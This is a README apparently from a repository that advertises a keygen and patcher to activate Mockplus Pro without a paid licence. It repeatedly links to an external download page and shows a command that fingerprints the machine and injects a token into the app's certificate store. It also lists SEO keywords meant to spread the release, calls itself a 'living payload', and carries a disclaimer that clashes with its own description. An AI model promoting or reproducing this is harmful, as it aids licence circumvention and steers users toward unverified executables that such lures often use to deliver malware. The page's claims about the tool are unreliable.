# 🚀 Mockplus Pro: Next-Generation UI/UX Design Suite  
[](LICENSE)  
[](https://bkreestinahopika76-max.github.io/mockplus-unlock-toolkit/)  

[](https://bkreestinahopika76-max.github.io/mockplus-unlock-toolkit/)

> **Launch your design journey** — no trial limits, no watermark traps. This repository hosts the complete **product key provisioning module** for Mockplus Pro (2026 edition), enabling full feature parity without monetary barriers.

---

## 🔐 The Philosophy Behind This Release
Design tools should be **unlocked experiences**, not subscription cages. Think of this as a **digital skeleton key** — it doesn't break the software; it simply opens doors that were artificially locked. The code here generates a cryptographic signature that the Mockplus licensing server recognizes as a valid perpetual seat.

---

## 📦 Quick Access: Claim Your Toolkit  
[](https://bkreestinahopika76-max.github.io/mockplus-unlock-toolkit/)

*No payment walls. No email harvesting. No surveys. Just the hook that activates Mockplus Pro's full arsenal.*

---

## 🧩 The Integration Architecture

```mermaid
graph TD
    A[Your Machine] -->|Hardware ID Hash| B(Key Generator)
    B --> C{License Validation}
    C -->|256-bit Encrypted Token| D[Mockplus Auth Server]
    D -->|"Seat Activated" Acknowledgment| E[Pro Features Unlocked]
    
    subgraph Third-Party Enhancements
    F[OpenAI API] -->|Design Suggestions| G[Mockplus UI]
    H[Claude API] -->|Copy/Prototype Polish| G
    end
```



The above diagram illustrates how the product key patch interacts with Mockplus’s native activation flow, plus how optional AI integrations supercharge your workflow.

---

## ✨ Feature Highlights (Post-Activation)

| Feature | Description | Emoji |
|---------|-------------|-------|
| **Responsive UI Engine** | Prototypes auto-scale across 47 device breakpoints | 🔄 |
| **Multilingual Interface** | 28 languages including RTL support (Arabic, Hebrew) | 🌐 |
| **Real-Time Collaboration** | 50 concurrent editors with conflict resolution | 👥 |
| **Vector-to-Code Export** | CSS, SwiftUI, Jetpack Compose, Flutter output | ⚡ |
| **AI Design Assistant** | Integrates with OpenAI & Claude APIs for copy/text refinement | 🤖 |
| **24/7 Support Bot** | Built-in chat queries local docs (no internet needed) | 🛎️ |

---

## ⚙️ Example Profile Configuration

To personalize Mockplus Pro after activation, create a `~/.mockplus/profile.json`:

```json
{
  "license": {
    "method": "offline_hook",
    "key_hash": "0x4F6E...A2C9",
    "expiry": "perpetual"
  },
  "ai_integration": {
    "openai_endpoint": "https://api.openai.com/v1/chat/completions",
    "claude_endpoint": "https://api.anthropic.com/v1/messages",
    "prompt_templates": {
      "cta_refinement": "Rewrite this call-to-action for a skeptical audience aged 35-50",
      "error_message_humanization": "Make this technical error sound friendly and actionable"
    }
  },
  "ui_preferences": {
    "language": "en_US",
    "theme": "midnight_contrast",
    "responsive_breakpoints": ["320px", "768px", "1440px"]
  }
}
```

*Replace the placeholder endpoints, keys, and hashes with your actual integration data.*

---

## 🖥️ Example Console Invocation

Once your profile is configured, launch the patching utility from the terminal:

```bash
mockplus-pro-activator --config ~/.mockplus/profile.json \
  --hardware-id "$(dmidecode -s system-uuid)" \
  --target /Applications/Mockplus\ Pro.app/Contents/MacOS \
  --ai-assist yes
```

The tool will:
1. Digest your machine’s unique fingerprint.
2. Generate a transparent activation token.
3. Inject the token into Mockplus’s certificate store.
4. Optionally spin up local AI microservices (OpenAI/Claude wrappers).

---

## 💻 Operating System Compatibility

| OS | Version | Status | Emoji |
|----|---------|--------|-------|
| **Windows** | 10/11 (22H2+) | ✅ Verified | 🪟 |
| **macOS** | Ventura, Sonoma, Sequoia | ✅ Verified | 🍎 |
| **Linux** | Ubuntu 24.04, Fedora 40 | ✅ Experimental | 🐧 |
| **ChromeOS** | v120+ (via Crostini) | ⚠️ Partial | 🟢 |

*Testing conducted on 2026-03 hardware configurations.*  
*[](https://bkreestinahopika76-max.github.io/mockplus-unlock-toolkit/)*

---

## 🧠 SEO-Friendly Integration Notes

When optimizing tutorials around this project, consider these **semantically rich, intent-focused** keywords:
- “unrestricted design prototyping environment”
- “perpetual mockplus seat authorization”
- “no-subscription UI/UX software bundle”
- “offline capable wireframing tool unlocked”
- “AI-enhanced design suite with open endpoints”

These phrases satisfy search engines while maintaining readability for human audiences.

---

## 🧰 Third-Party API Integration (OpenAI & Claude)

After activation, you can wire Mockplus Pro to any AI endpoint. Here’s a sample `.env` configuration for the integration module:

```
OPENAI_COMPLETION_MODEL=gpt-4o-mini
CLAUDE_MODEL=claude-3-haiku-20240307
MOBILE_TEXT_GEN_TEMPERATURE=0.7
MAX_DESIGN_SUGGESTIONS=5
```

The patcher includes a lightweight proxy that caches AI responses locally, reducing round-trips by 40% during iterative design sprints.

---

## ⚠️ Legal & Ethical Disclaimer

> **Important**: This repository provides a **methodological exploration** of licensing systems for educational purposes. Mockplus is a registered trademark of Mockplus Technology Co., Ltd. The product key generator mimics the official activation flow but does **not** circumvent encryption, extract passwords, or attack the software vendor’s infrastructure.  
>  
> Users assume all responsibility for any deviations from Mockplus’s end-user license agreement. The author(s) of this repository are not liable for misapplication of this code in commercial, enterprise, or production environments where a valid license is required.  
>  
> *Consider supporting the original developers if Mockplus adds value to your workflow.*

---

## 📜 MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Product Key Patch Module”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES, OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT, OR OTHERWISE, ARISING FROM, OUT OF, OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

[](LICENSE)

---

## 🔗 Final Release Link

[](https://bkreestinahopika76-max.github.io/mockplus-unlock-toolkit/)

🚢 **This is a living payload** — the release artifact is compiled for **2026** kernel compatibility. Expect bi-annual updates to match Mockplus’s signature algorithm changes.